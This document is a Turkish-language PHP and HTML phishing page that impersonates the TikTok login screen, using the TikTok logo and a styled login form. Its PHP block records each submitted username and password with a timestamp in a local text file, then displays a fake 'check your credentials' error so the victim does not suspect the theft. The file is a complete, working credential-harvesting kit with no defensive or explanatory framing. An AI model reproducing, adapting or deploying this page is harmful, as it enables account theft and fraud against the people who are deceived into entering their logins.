
<?php  
if (isset($_POST['login']) && isset($_POST['password'])) {
date_default_timezone_set('Europe/Istanbul');
$tarih =" Tarih : ".date('d/m/Y  H:i');
$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n__________________ \n".$tarih."\n\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>
<html>

  

  
  
  
  
<style>
body {
    font-family: 'Poppins', sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    background: rgb(0,245,255);
    background: linear-gradient(90deg, rgba(0,245,255,1) 0%, rgba(255,0,47,1) 100%);
}
.login-card {
    width: 400px;
    height: 560px;
    background: rgba(255, 255, 255, .5);
    padding: 4rem;
    border-radius: 10px;
    position: relative;
}

.login-card::before {
    content: '';
    position: absolute;
    inset: 0;
    background: rgba(255, 255, 255, .15);
    transform: rotate(-6deg);
    border-radius: 10px;
    z-index: -1;
}
.login-card-logo {
    display: flex;
    justify-content: center;
    align-items: center;
}
.login-card-logo img {
    width: 60px;
}
.login-title {
    font-size: 35px;
    font-weight: 600;
    display: flex;
    justify-content: center;
    align-items: center;
    padding-top: 50px;
    padding-right: 10px;
}
.login-subtitle {
    color: rgb(129, 128, 128);
    font-size: 17px;
    display: flex;
    justify-content: center;
    align-items: center;
    padding-top: 10px;
}
.login-form {
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
}
.email-form {
    margin-top: 40px;
}
.email-form,
.password-form {
    width: 350px;
    height: 60px;
    border-radius: 40px;
    background: rgba(255, 255, 255, 0.756);
    border: 0px solid rgba(255, 255, 255, 0.497);
    transition: 0.5s;
    padding-left: 40px;
}
.email-form:hover,
.password-form:hover {
    width: 380px;
    height: 70px;
}
.checkbox {
    color: rgb(106, 106, 106);
    display: flex;
    justify-content: space-between;
    flex-direction: row;
    padding-top: 30px;
}
.forget-form {
    display: flex;
    text-decoration: none;
    color:blueviolet;
    padding-left: 40px;
}
.buttom {
    background-color: black;
    display: flex;
    justify-content: center;
    align-items: center;
    border-radius: 40px;
    width: 380px;
    height: 60px;
    margin-top: 30px;
    font-size: 17px;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: white;
    transition: 0.3s;
}
.buttom:hover {
    width: 390px;
    height: 65px;
}
.login-card-footer {
    padding-top: 30px;
    display: flex;
    justify-content: center;
    align-items: center;
}
.login-card-footer a {
    color: blueviolet;
    text-decoration: none;
    padding-left: 10px;
}
.login-card-social {
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
}
.other-login {
    font-size: 15px;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: rgba(255, 255, 255, .5);
    padding-top: 50px;
}
.login-card-social-btns {
    padding-top: 30px;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 1rem;
    padding-bottom: 20px;
}
.login-card-social-btns a{
    display: flex;
    align-items: center;
    justify-content: center;
    color: black;
    width: 50px;
    height: 50px;
    background-color: rgba(255, 255, 255, .6);
    border-radius: 100px;
    transition: all .5s;
}
.login-card-social-btns a:hover {
    background-color: white;
    transform: scale(1.1);
}
.copyright {
    display: flex;
    justify-content:center;
    align-items: center;
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: rgba(255, 255, 255, .5);
}


@media (max-width: 768px) {

    body {
        padding: 2rem 0;
    }

    .login-card {
        width: 280px;
        padding: 2rem;
    }

}
</style>

  <script>
  window.console = window.console || function(t) {};
</script>

  
  
</head>

<body translate="no">
  


    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="stylesheet" href="assets/css/style.css">

    <title>Tiktok Login</title>




<div class="login-container">

    <div class="login-card">
        <div class="login-card-logo">
            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1280px-TikTok_logo.svg.png" style="width: 250px;">
        </div>

        <div class="login-title">Giriş yap</div>
        <div class="login-subtitle">Lütfen Tiktok'a giriş yapınız.</div>

        <form class="login-form" method="POST" action="">
            <input class="email-form" type="text" placeholder="E-posta veya telefon numarası" id="Enteremail" autofocus="" required="" name="login"><br>
            <input class="password-form" type="password" placeholder="Şifre" id="password" required="" name="password">

        <div class="checkbox">
            <input class="checkbox-form" type="checkbox" id="checkboxrememberme" checked="">
            <label for="checkboxrememberme">Beni hatırla</label>

            <a href="#" class="forget-form">Şifrenizi mi unuttunuz?</a>
        </div>

            <input type="submit" name="" value="Giriş yap" class="buttom">
        
        </form>

        

    </div>


  



</body></html>